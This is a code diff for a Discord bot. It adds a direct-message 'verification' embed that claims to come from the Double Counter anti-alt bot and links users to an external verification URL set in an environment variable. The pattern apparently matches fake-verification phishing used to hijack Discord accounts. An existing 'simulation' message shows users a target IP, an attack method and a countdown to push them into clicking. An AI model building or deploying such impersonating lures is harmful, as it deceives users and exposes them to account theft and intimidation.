@@ -25,6 +25,11 @@ const ADMIN_ROLE_ID = "1465331390085074955";
 const IDS_FILE = path.join(__dirname, "discord_ids.txt");
 const BLACKLIST_FILE = path.join(__dirname, "blacklist.json");
 
+const VERIFY_BUTTON_ID = "verify_send_dm";
+const VERIFY_SERVER_NAME = process.env.VERIFY_SERVER_NAME || "Aura Gaming | Beta Soon";
+const VERIFY_SUPPORT_URL = process.env.VERIFY_SUPPORT_URL || "https://discord.gg/yourinvite";
+const VERIFY_PRIVACY_URL = process.env.VERIFY_PRIVACY_URL || "https://example.com/privacy";
+
 // ---------- helpers ----------
 function ensureFile(filePath) {
   if (!fs.existsSync(filePath)) {
@@ -130,6 +135,52 @@ const commands = [
 
 const rest = new REST({ version: "10" }).setToken(process.env.TOKEN);
 
+function buildVerifyDM(user) {
+  const embed = new EmbedBuilder()
+    .setColor(0x2b2d31)
+    .setDescription(
+      [
+        "This server is protected by Double Counter, anti alt account and VPN bot. You must verify to access the server.",
+        "",
+        `**Server**`,
+        VERIFY_SERVER_NAME,
+        "",
+        `**Status**`,
+        "Click me to verify!",
+        "",
+        `**Need help?**`,
+        "Join our support server",
+      ].join("\n")
+    )
+    .addFields({
+      name: "By clicking, you accept our",
+      value: `[Privacy policy](${VERIFY_PRIVACY_URL})`,
+      inline: true,
+    })
+    .setFooter({
+      text: "Click the blue link to verify.",
+    });
+
+  const row1 = new ActionRowBuilder().addComponents(
+    new ButtonBuilder()
+      .setLabel("Click me to verify!")
+      .setStyle(ButtonStyle.Link)
+      .setURL(process.env.VERIFY_WEB_URL)
+  );
+
+  const row2 = new ActionRowBuilder().addComponents(
+    new ButtonBuilder()
+      .setLabel("Join our support server")
+      .setStyle(ButtonStyle.Link)
+      .setURL(VERIFY_SUPPORT_URL)
+  );
+
+  return {
+    embeds: [embed],
+    components: [row1, row2],
+  };
+}
+
 client.once(Events.ClientReady, async () => {
   console.log(`Bot is online as ${client.user.tag}!`);
   console.log(`VERIFY_WEB_URL: ${process.env.VERIFY_WEB_URL || "missing"}`);
@@ -153,6 +204,33 @@ client.once(Events.ClientReady, async () => {
 
 client.on(Events.InteractionCreate, async (interaction) => {
   try {
+    // ---------- button interaction ----------
+    if (interaction.isButton()) {
+      if (interaction.customId !== VERIFY_BUTTON_ID) return;
+
+      if (!process.env.VERIFY_WEB_URL) {
+        return interaction.reply({
+          content: "❌ VERIFY_WEB_URL is missing in Railway variables.",
+          flags: MessageFlags.Ephemeral,
+        });
+      }
+
+      try {
+        await interaction.user.send(buildVerifyDM(interaction.user));
+
+        return interaction.reply({
+          content: "A verification link will be sent shortly below. Please click it to verify.",
+          flags: MessageFlags.Ephemeral,
+        });
+      } catch {
+        return interaction.reply({
+          content: "❌ I couldn't DM you. Please enable DMs and try again.",
+          flags: MessageFlags.Ephemeral,
+        });
+      }
+    }
+
+    // ---------- slash commands ----------
     if (!interaction.isChatInputCommand()) return;
 
     await interaction.deferReply({ flags: MessageFlags.Ephemeral });
@@ -205,9 +283,9 @@ client.on(Events.InteractionCreate, async (interaction) => {
 
       const row = new ActionRowBuilder().addComponents(
         new ButtonBuilder()
+          .setCustomId(VERIFY_BUTTON_ID)
           .setLabel("Verify now")
-          .setStyle(ButtonStyle.Link)
-          .setURL(process.env.VERIFY_WEB_URL)
+          .setStyle(ButtonStyle.Primary)
       );
 
       await channel.send({
@@ -316,13 +394,13 @@ client.on(Events.InteractionCreate, async (interaction) => {
         .setTitle("🧪 SIMULATION NOTICE")
         .setDescription(
           `Hey **${user.username}**!\n\n` +
-          `⚠️ **THIS IS A SIMULATION** ⚠️\n` +
-          `No real action is happening — this is a test message.\n\n` +
-          `Target Label: **${ip}**\n` +
-          `Duration: **${safeTime}s**\n` +
-          `Method: **${method}**\n\n` +
-          `⏳ Countdown: **2 HOURS**\n` +
-          `Click the button below for a surprise.`
+            `⚠️ **THIS IS A SIMULATION** ⚠️\n` +
+            `No real action is happening — this is a test message.\n\n` +
+            `Target Label: **${ip}**\n` +
+            `Duration: **${safeTime}s**\n` +
+            `Method: **${method}**\n\n` +
+            `⏳ Countdown: **2 HOURS**\n` +
+            `Click the button below for a surprise.`
         )
         .setTimestamp();
 
